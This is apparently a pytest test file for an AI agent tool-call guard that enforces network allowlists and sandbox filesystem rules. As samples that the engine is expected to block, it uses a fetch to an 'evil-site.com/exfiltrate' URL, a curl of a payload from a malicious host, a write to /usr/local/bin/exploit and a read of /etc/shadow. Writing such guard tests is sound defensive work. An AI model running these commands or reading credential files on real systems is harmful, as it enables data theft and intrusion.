"""Tests for NemoClaw integration in FullEngine."""

import pytest
from pathlib import Path

from safeclaw.config import SafeClawConfig
from safeclaw.engine.core import ToolCallEvent
from safeclaw.engine.full_engine import FullEngine
from safeclaw.engine.knowledge_graph import SP


def _write_yaml(policy_dir: Path, filename: str, content: str) -> None:
    """Helper to write a YAML file to the policy directory."""
    policy_dir.mkdir(parents=True, exist_ok=True)
    (policy_dir / filename).write_text(content, encoding="utf-8")


@pytest.fixture
def nemoclaw_policy_dir(tmp_path):
    """Create a NemoClaw policy directory with sample policies."""
    policy_dir = tmp_path / "nemoclaw"
    _write_yaml(policy_dir, "sandbox.yaml", """
rules:
  - name: github-https
    host: "github.com"
    port: 443
    protocol: https
    allow: true
  - name: pypi
    host: "pypi.org"
    port: 443
    protocol: https
    allow: true

filesystem:
  - path: "/sandbox"
    mode: "read-write"
  - path: "/usr"
    mode: "read-only"
  - path: "/etc/shadow"
    mode: "denied"
""")
    return policy_dir


@pytest.fixture
def engine(tmp_path, nemoclaw_policy_dir):
    """Create a test engine with NemoClaw enabled."""
    config = SafeClawConfig(
        data_dir=tmp_path,
        ontology_dir=Path(__file__).parent.parent / "safeclaw" / "ontologies",
        audit_dir=tmp_path / "audit",
        nemoclaw_enabled=True,
        nemoclaw_policy_dir=nemoclaw_policy_dir,
    )
    return FullEngine(config)


@pytest.fixture
def engine_no_nemoclaw(tmp_path):
    """Create a test engine without NemoClaw."""
    config = SafeClawConfig(
        data_dir=tmp_path,
        ontology_dir=Path(__file__).parent.parent / "safeclaw" / "ontologies",
        audit_dir=tmp_path / "audit",
    )
    return FullEngine(config)


class TestNemoClawEngineInit:
    def test_nemoclaw_triples_loaded(self, engine):
        """NemoClaw policy triples should be in the knowledge graph after init."""
        results = engine.kg.query(f"""
            PREFIX sp: <{SP}>
            SELECT ?rule WHERE {{ ?rule a sp:NemoNetworkRule . }}
        """)
        assert len(results) >= 2  # github + pypi

    def test_nemoclaw_filesystem_triples_loaded(self, engine):
        results = engine.kg.query(f"""
            PREFIX sp: <{SP}>
            SELECT ?rule WHERE {{ ?rule a sp:NemoFilesystemRule . }}
        """)
        assert len(results) >= 3  # /sandbox, /usr, /etc/shadow

    def test_no_nemoclaw_triples_when_disabled(self, engine_no_nemoclaw):
        """Without NemoClaw enabled, no NemoClaw triples should exist."""
        results = engine_no_nemoclaw.kg.query(f"""
            PREFIX sp: <{SP}>
            SELECT ?rule WHERE {{
                ?rule a sp:NemoNetworkRule .
                ?rule sp:source "nemoclaw" .
            }}
        """)
        # Only ontology class definitions, no instances with source
        assert len(results) == 0

    def test_policy_checker_nemoclaw_enabled(self, engine):
        """PolicyChecker should have nemoclaw_enabled=True."""
        assert engine.policy_checker._nemoclaw_enabled is True

    def test_policy_checker_nemoclaw_disabled(self, engine_no_nemoclaw):
        """PolicyChecker should have nemoclaw_enabled=False."""
        assert engine_no_nemoclaw.policy_checker._nemoclaw_enabled is False


class TestNemoClawNetworkEnforcement:
    @pytest.mark.asyncio
    async def test_allowed_web_fetch(self, engine):
        """WebFetch to an allowed host should pass."""
        event = ToolCallEvent(
            session_id="test-session",
            user_id="test-user",
            tool_name="web_fetch",
            params={"url": "https://github.com/api/repos"},
        )
        decision = await engine.evaluate_tool_call(event)
        assert decision.block is False

    @pytest.mark.asyncio
    async def test_blocked_web_fetch(self, engine):
        """WebFetch to a non-allowlisted host should be blocked."""
        event = ToolCallEvent(
            session_id="test-session",
            user_id="test-user",
            tool_name="web_fetch",
            params={"url": "https://evil-site.com/exfiltrate"},
        )
        decision = await engine.evaluate_tool_call(event)
        assert decision.block is True
        assert "NemoClaw" in decision.reason or "network allowlist" in decision.reason

    @pytest.mark.asyncio
    async def test_curl_to_blocked_host(self, engine):
        """curl command to non-allowlisted host should be blocked."""
        event = ToolCallEvent(
            session_id="test-session",
            user_id="test-user",
            tool_name="exec",
            params={"command": "curl https://malicious.example.com/payload"},
        )
        decision = await engine.evaluate_tool_call(event)
        assert decision.block is True


class TestNemoClawFilesystemEnforcement:
    @pytest.mark.asyncio
    async def test_write_to_sandbox_allowed(self, engine):
        """Writing to /sandbox should be allowed (read-write)."""
        event = ToolCallEvent(
            session_id="test-session",
            user_id="test-user",
            tool_name="write",
            params={"file_path": "/sandbox/output/result.txt"},
        )
        decision = await engine.evaluate_tool_call(event)
        assert decision.block is False

    @pytest.mark.asyncio
    async def test_write_to_readonly_blocked(self, engine):
        """Writing to /usr should be blocked (read-only)."""
        event = ToolCallEvent(
            session_id="test-session",
            user_id="test-user",
            tool_name="write",
            params={"file_path": "/usr/local/bin/exploit"},
        )
        decision = await engine.evaluate_tool_call(event)
        assert decision.block is True
        assert "read-only" in decision.reason

    @pytest.mark.asyncio
    async def test_read_from_readonly_allowed(self, engine):
        """Reading from /usr should be allowed (read-only)."""
        event = ToolCallEvent(
            session_id="test-session",
            user_id="test-user",
            tool_name="read",
            params={"file_path": "/usr/local/lib/libz.so"},
        )
        decision = await engine.evaluate_tool_call(event)
        assert decision.block is False

    @pytest.mark.asyncio
    async def test_read_denied_path_blocked(self, engine):
        """Reading from /etc/shadow should be blocked (denied)."""
        event = ToolCallEvent(
            session_id="test-session",
            user_id="test-user",
            tool_name="read",
            params={"file_path": "/etc/shadow"},
        )
        decision = await engine.evaluate_tool_call(event)
        assert decision.block is True
        assert "denied" in decision.reason

    @pytest.mark.asyncio
    async def test_outside_sandbox_blocked(self, engine):
        """File access outside all defined paths should be blocked."""
        event = ToolCallEvent(
            session_id="test-session",
            user_id="test-user",
            tool_name="write",
            params={"file_path": "/home/user/documents/secret.txt"},
        )
        decision = await engine.evaluate_tool_call(event)
        assert decision.block is True
        assert "outside NemoClaw sandbox" in decision.reason


class TestNemoClawHotReload:
    @pytest.mark.asyncio
    async def test_reload_picks_up_new_policy(self, tmp_path):
        """Hot-reload should re-ingest NemoClaw policies."""
        policy_dir = tmp_path / "nemoclaw"
        _write_yaml(policy_dir, "sandbox.yaml", """
rules:
  - name: github
    host: "github.com"
    port: 443
    protocol: https
    allow: true
""")
        config = SafeClawConfig(
            data_dir=tmp_path,
            ontology_dir=Path(__file__).parent.parent / "safeclaw" / "ontologies",
            audit_dir=tmp_path / "audit",
            nemoclaw_enabled=True,
            nemoclaw_policy_dir=policy_dir,
        )
        engine = FullEngine(config)

        # Initially, only github allowed
        event = ToolCallEvent(
            session_id="test-session",
            user_id="test-user",
            tool_name="web_fetch",
            params={"url": "https://pypi.org/simple/"},
        )
        decision = await engine.evaluate_tool_call(event)
        assert decision.block is True

        # Update policy to also allow pypi
        _write_yaml(policy_dir, "sandbox.yaml", """
rules:
  - name: github
    host: "github.com"
    port: 443
    protocol: https
    allow: true
  - name: pypi
    host: "pypi.org"
    port: 443
    protocol: https
    allow: true
""")

        # Hot-reload
        await engine.reload()

        # Now pypi should be allowed
        decision2 = await engine.evaluate_tool_call(event)
        assert decision2.block is False


class TestExistingTestsUnaffected:
    @pytest.mark.asyncio
    async def test_read_file_still_allowed(self, engine_no_nemoclaw):
        """Existing functionality: reading files should still be allowed."""
        event = ToolCallEvent(
            session_id="test-session",
            user_id="test-user",
            tool_name="read",
            params={"file_path": "/src/main.py"},
        )
        decision = await engine_no_nemoclaw.evaluate_tool_call(event)
        assert decision.block is False

    @pytest.mark.asyncio
    async def test_force_push_still_blocked(self, engine_no_nemoclaw):
        """Existing functionality: force push should still be blocked."""
        event = ToolCallEvent(
            session_id="test-session",
            user_id="test-user",
            tool_name="exec",
            params={"command": "git push --force origin main"},
        )
        decision = await engine_no_nemoclaw.evaluate_tool_call(event)
        assert decision.block is True
